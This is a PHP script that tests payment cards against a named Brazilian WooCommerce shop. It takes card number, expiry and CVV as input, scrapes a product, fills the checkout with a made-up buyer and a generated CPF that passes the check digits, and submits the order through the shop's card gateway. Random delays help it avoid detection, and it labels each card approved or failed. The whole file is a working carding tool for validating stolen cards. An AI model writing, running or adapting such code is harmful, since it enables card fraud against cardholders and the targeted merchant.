<?php
$lista = $_GET['lista'] ?? '';
$parts = explode('|', $lista);
if (count($parts) !== 4) die("ERRO|Formato inválido. Use: numero|mes|ano|cvv");
list($card_number, $exp_month, $exp_year, $cvv) = $parts;
$exp_month = str_pad($exp_month, 2, '0', STR_PAD_LEFT);
$exp_year  = substr($exp_year, -2);

$cookieFile = tempnam(sys_get_temp_dir(), 'cookie_');
$userAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';

function request($url, $post = null, $headers = [], $referer = '', $follow = true) {
    global $cookieFile, $userAgent;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, $follow);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    if ($referer) curl_setopt($ch, CURLOPT_REFERER, $referer);
    if ($post !== null) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($post) ? http_build_query($post) : $post);
    }
    if (!empty($headers)) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function extrairErroHTML($html) {
    $patterns = [
        '/<ul class="woocommerce-error"[^>]*>(.*?)<\/ul>/s',
        '/<div class="woocommerce-error"[^>]*>(.*?)<\/div>/s',
        '/<div class="woocommerce-message"[^>]*>(.*?)<\/div>/s',
        '/<div class="belluno-error"[^>]*>(.*?)<\/div>/s',
        '/<p class="error"[^>]*>(.*?)<\/p>/s'
    ];
    foreach ($patterns as $pattern) {
        if (preg_match($pattern, $html, $match)) {
            $msg = trim(strip_tags($match[1]));
            if (!empty($msg)) return $msg;
        }
    }
    return null;
}

function gerarCPF() {
    $n = array_map(function(){ return rand(0,9); }, range(1,9));
    $d1 = 11 - (($n[8]*2 + $n[7]*3 + $n[6]*4 + $n[5]*5 + $n[4]*6 + $n[3]*7 + $n[2]*8 + $n[1]*9 + $n[0]*10) % 11);
    if ($d1 >= 10) $d1 = 0;
    $d2 = 11 - (($d1*2 + $n[8]*3 + $n[7]*4 + $n[6]*5 + $n[5]*6 + $n[4]*7 + $n[3]*8 + $n[2]*9 + $n[1]*10 + $n[0]*11) % 11);
    if ($d2 >= 10) $d2 = 0;
    $cpf = implode('', $n) . $d1 . $d2;
    return substr($cpf,0,3).'.'.substr($cpf,3,3).'.'.substr($cpf,6,3).'-'.substr($cpf,9,2);
}

function gerarPessoa() {
    $nomes = ['Ana','Maria','Regina','Fernanda','Juliana','Patrícia','Camila','Larissa'];
    $sobrenomes = ['Silva','Santos','Oliveira','Souza','Lima','Pereira','Costa','Alves'];
    $primeiroNome = $nomes[array_rand($nomes)];
    $ultimoNome = $sobrenomes[array_rand($sobrenomes)];
    $email = strtolower($primeiroNome . '.' . $ultimoNome . rand(100,999) . '@gmail.com');
    $telefone = '(11) 9' . rand(1000,9999) . '-' . rand(1000,9999);
    $nascimento = date('d/m/Y', strtotime('-'.rand(20,45).' years'));
    return [$primeiroNome, $ultimoNome, $email, $telefone, $nascimento];
}

function sleepRand() {
    usleep(rand(800000, 2500000));
}

$home = request('https://xikids.com.br/loja/');
if (!$home) die($lista . "--->ERRO|Site offline");
sleepRand();

preg_match('/<a[^>]+href="(https?:\/\/xikids\.com\.br\/produto\/[^"]+)"[^>]*>/', $home, $match);
if (empty($match[1])) die($lista . "--->ERRO|Nenhum produto");
$productPage = request($match[1]);
if (!$productPage) die($lista . "--->ERRO|Produto inacessível");
sleepRand();

preg_match('/data-product_id="(\d+)"/', $productPage, $idMatch);
$produtoId = $idMatch[1] ?? null;
if (!$produtoId) die($lista . "--->ERRO|Produto sem ID");

$addData = ['product_id' => $produtoId, 'quantity' => 1, 'add-to-cart' => $produtoId];
if (preg_match('/data-product_variations="([^"]+)"/', $productPage, $varMatch)) {
    $vars = json_decode(html_entity_decode($varMatch[1], ENT_QUOTES, 'UTF-8'), true);
    if (!empty($vars)) {
        $var = $vars[0];
        $addData['variation_id'] = $var['variation_id'];
        foreach (($var['attributes'] ?? []) as $k => $v) $addData[$k] = $v;
    }
}
request('https://xikids.com.br/', $addData, ['Content-Type: application/x-www-form-urlencoded']);
sleepRand();

$checkoutHtml = request('https://xikids.com.br/finalizar-compra/');
preg_match('/name="woocommerce-process-checkout-nonce" value="([^"]+)"/', $checkoutHtml, $nonceMatch);
$checkoutNonce = $nonceMatch[1] ?? '';
preg_match('/"update_order_review_nonce":"([^"]+)"/', $checkoutHtml, $securityMatch);
$updateSecurity = $securityMatch[1] ?? '';
if (!$checkoutNonce || !$updateSecurity) die($lista . "--->ERRO|Nonce checkout");
sleepRand();

list($nome, $sobrenome, $email, $telefone, $nascimento) = gerarPessoa();
$cpf = gerarCPF();
$senha = substr(md5($cpf . time()), 0, 12) . '!';

$cliente = [
    'billing_first_name' => $nome,
    'billing_last_name'  => $sobrenome,
    'billing_email'      => $email,
    'billing_phone'      => $telefone,
    'billing_cpf'        => $cpf,
    'billing_country'    => 'BR',
    'billing_postcode'   => '14680-021',
    'billing_address_1'  => 'Rua Treze de Maio',
    'billing_number'     => rand(10,999),
    'billing_address_2'  => 'Casa',
    'billing_neighborhood'=> 'Centro',
    'billing_city'       => 'Jardinópolis',
    'billing_state'      => 'SP'
];

$updateData = array_merge($cliente, [
    'security' => $updateSecurity,
    'payment_method' => 'belluno_card',
    'ship_to_different_address' => '0',
    'post_data' => http_build_query(array_merge($cliente, [
        'payment_method' => 'belluno_card',
        'woocommerce-process-checkout-nonce' => $checkoutNonce
    ]))
]);
request('https://xikids.com.br/?wc-ajax=update_order_review', $updateData, ['Content-Type: application/x-www-form-urlencoded'], 'https://xikids.com.br/finalizar-compra/');
sleepRand();

$bandeira = match(substr($card_number, 0, 1)) {
    '4' => 'visa',
    '5' => 'mastercard',
    '3' => 'amex',
    default => 'visa'
};

$checkoutData = array_merge($cliente, [
    'payment_method' => 'belluno_card',
    'belluno_credit_card_number' => $card_number,
    'belluno_credit_card_expiration' => $exp_month . '/' . $exp_year,
    'belluno_credit_card_security_code' => $cvv,
    'belluno_credit_card_name' => $nome . ' ' . $sobrenome,
    'belluno_credit_card_birthdate' => $nascimento,
    'belluno_credit_card_phone' => $telefone,
    'belluno_credit_card_document' => $cpf,
    'belluno_credit_card_installments' => 1,
    'belluno_credit_card_brand' => $bandeira,
    'woocommerce-process-checkout-nonce' => $checkoutNonce,
    '_wp_http_referer' => '/finalizar-compra/',
    'shipping_method[0]' => 'flat_rate:255',
    'account_password' => $senha
]);

$checkoutResp = request('https://xikids.com.br/?wc-ajax=checkout', $checkoutData, [
    'Content-Type: application/x-www-form-urlencoded',
    'X-Requested-With: XMLHttpRequest'
], 'https://xikids.com.br/finalizar-compra/', false);
sleepRand();

$json = json_decode($checkoutResp, true);
$cardString = "$card_number|$exp_month|$exp_year|$cvv";
$mensagem = '';

if ($json !== null) {
    if (isset($json['redirect']) && !empty($json['redirect'])) {
        $finalHtml = request($json['redirect'], null, [], '', true);
        $mensagem = extrairErroHTML($finalHtml);
        if (!$mensagem) {
            $mensagem = strpos($json['redirect'], 'order-received') !== false ? "APROVADO! Pedido confirmado." : "ERRO: Redirecionamento sem erro.";
        } else {
            $mensagem = "ERRO: $mensagem";
        }
    }
    elseif (isset($json['reload']) && $json['reload'] === true) {
        $reloadedHtml = request('https://xikids.com.br/finalizar-compra/', null, [], '', true);
        $mensagem = extrairErroHTML($reloadedHtml);
        $mensagem = $mensagem ? "ERRO: $mensagem" : "ERRO: Falha no reload (possível bloqueio)";
    }
    elseif (isset($json['result']) && $json['result'] === 'success') {
        $mensagem = "APROVADO! " . strip_tags($json['messages'] ?? 'Pedido realizado');
    }
    elseif (isset($json['result']) && $json['result'] === 'failure') {
        $mensagem = "ERRO: " . strip_tags($json['messages'] ?? 'Falha no pagamento');
    }
    else {
        $mensagem = "ERRO: JSON inesperado - " . json_encode($json);
    }
} else {
    $mensagem = extrairErroHTML($checkoutResp);
    if (!$mensagem) $mensagem = "ERRO: Resposta inválida do servidor";
    else $mensagem = "ERRO: $mensagem";
}

echo $cardString . "--->" . $mensagem;
@unlink($cookieFile);
?>